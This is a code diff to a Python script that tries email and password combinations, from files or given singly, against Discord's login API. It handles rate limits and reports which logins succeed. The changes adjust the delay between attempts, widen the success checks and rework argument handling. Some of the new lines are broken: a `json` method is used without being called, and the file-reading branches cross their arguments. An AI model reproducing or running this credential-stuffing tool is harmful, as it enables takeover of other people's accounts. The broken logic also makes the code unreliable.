@@ -19,14 +19,13 @@ def login_file():
             req.headers.update({"Content-Type": "application/json"})
             data = '{{"email": "{}", "password": "{}", "undelete": false, "captcha_key": null, "login_source": null, "gift_code_sku_id": null}}'.format(t, k)
             teq = req.post("https://discordapp.com/api/v6/auth/login", data=data)
-            time.sleep(0.200)
+            time.sleep(0.371)
             if "retry_after" in teq.json():
                 laannn = "0." + str(teq.json()['retry_after'])
                 time.sleep(float(laannn))
-            print("Data:", teq.json())
             print("Email:", t)
             print("Password:", k)
-            if "ticket" in teq.json():
+            if "ticket" in teq.json() or "user_settings" in teq.json() or "token" in teq.json():
                 print("-------------------------")
                 print("Successful!")
                 print("=========>>>><<<<========")
@@ -49,7 +48,7 @@ def login_one():
         teq = req.post("https://discordapp.com/api/v6/auth/login", data=data)
         print("Email:", t)
         print("Password:", k)
-        if "ticket" in teq.json():
+        if "ticket" in teq.json() or "user_settings" in teq.json or len(teq.json["token"]) > 6:
             print("-------------------------")
             print("Successful!")
             print("=========>>>><<<<========")
@@ -64,17 +63,19 @@ def login_one():
         exit()
 if not os.path.exists(sys.argv[1]):
     bat = sys.argv[1]
+else:
+    with open(sys.argv[2], "r") as password:
+        has = password.read().splitlines()
 if not os.path.exists(sys.argv[2]):
     has = sys.argv[2]
-with open(sys.argv[1], "r") as user:
-    bat = user.read().splitlines()
-with open(sys.argv[2], "r") as password:
-    has = password.read().splitlines()
+else:
+    with open(sys.argv[1], "r") as user:
+        bat = user.read().splitlines()
 if type(bat) == list and type(has) == list:
     login_file()
 if type(bat) != list and type(has) != list:
-    raise Exception("Something went wrong!")
-if type(bat) != list or type(has) != list:
     login_one()
-if type(bat) == list or type(has) == list:
+if type(bat) != list and type(has) == list:
+    raise Exception("Something went wrong!")
+if type(bat) == list and type(has) != list:
     raise Exception("Something went wrong!")
